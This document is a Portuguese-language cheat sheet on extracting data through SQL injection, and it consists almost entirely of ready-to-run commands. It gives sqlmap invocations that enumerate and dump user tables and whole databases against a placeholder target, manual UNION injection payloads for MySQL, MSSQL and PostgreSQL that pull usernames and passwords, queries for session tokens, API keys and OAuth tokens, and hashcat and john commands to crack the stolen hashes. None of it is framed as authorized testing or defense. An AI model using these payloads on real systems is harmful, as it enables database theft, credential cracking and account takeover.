# Extração de Dados

## Estratégia de Extração Eficiente

### 1. Identificar tabelas prioritárias
```bash
sqlmap -u "http://alvo.com/?id=1" -D app --tables --batch
# Procurar: users, admin, accounts, credentials, sessions
```

### 2. Listar colunas da tabela alvo
```bash
sqlmap -u "http://alvo.com/?id=1" -D app -T users --columns --batch
```

### 3. Extrair somente colunas relevantes
```bash
sqlmap -u "http://alvo.com/?id=1" \
  -D app -T users \
  -C "id,username,password,email,is_admin" \
  --dump --batch
```

## Formatos de Saída

```bash
# CSV (padrão)
sqlmap -u "http://alvo.com/?id=1" -D app -T users --dump --batch
# Salvo em: ~/.sqlmap/output/alvo.com/dump/app/users.csv

# Dump completo de todos os bancos
sqlmap -u "http://alvo.com/?id=1" --dump-all --batch
```

## Técnicas de Extração Manual

### MySQL — Concatenação
```sql
-- Extrair múltiplas colunas em uma
' UNION SELECT NULL, CONCAT(username,':',password,':',email), NULL FROM users--

-- Com GROUP_CONCAT (todas as linhas)
' UNION SELECT NULL, GROUP_CONCAT(username,':',password SEPARATOR '\n'), NULL FROM users--
```

### MSSQL — FOR XML
```sql
-- Extrair como XML
'; SELECT * FROM users FOR XML AUTO--
```

### PostgreSQL — Array
```sql
-- Extrair como array
' UNION SELECT NULL, array_to_string(array_agg(username||':'||password),'\n'), NULL FROM users--
```

## Extração com Restrições de Tamanho

Quando a resposta trunca dados longos:

```bash
# Extrair em partes (LIMIT/OFFSET)
sqlmap -u "http://alvo.com/?id=1" \
  -D app -T users \
  --dump \
  --start=1 --stop=50 \
  --batch

# Próximo bloco
--start=51 --stop=100
```

## Coleção de Dados Sensíveis

### Senhas e Hashes
```bash
# Extrair e tentar crack automático
sqlmap -u "http://alvo.com/?id=1" \
  --passwords \
  --crack \
  --batch
```

### Dados de Sessão
```sql
-- PHP sessions no banco
SELECT * FROM sessions WHERE user_id = 1;
SELECT * FROM user_tokens WHERE type='auth';
```

### Chaves API
```sql
SELECT api_key, api_secret FROM integrations;
SELECT token FROM oauth_tokens WHERE revoked=0;
```

## Exportar para Arquivo

```bash
# Redirecionar output
sqlmap -u "http://alvo.com/?id=1" \
  -D app -T users --dump --batch \
  2>&1 | tee dump_$(date +%Y%m%d).txt

# Localizar arquivos de dump
find ~/.sqlmap/output/ -name "*.csv" 2>/dev/null
```

## Crack de Hashes Extraídos

```bash
# Identificar tipo de hash
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"
# → MD5

# Crack com hashcat
hashcat -m 0 hashes.txt wordlist.txt  # MD5
hashcat -m 3200 hashes.txt wordlist.txt  # bcrypt

# Crack com john
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
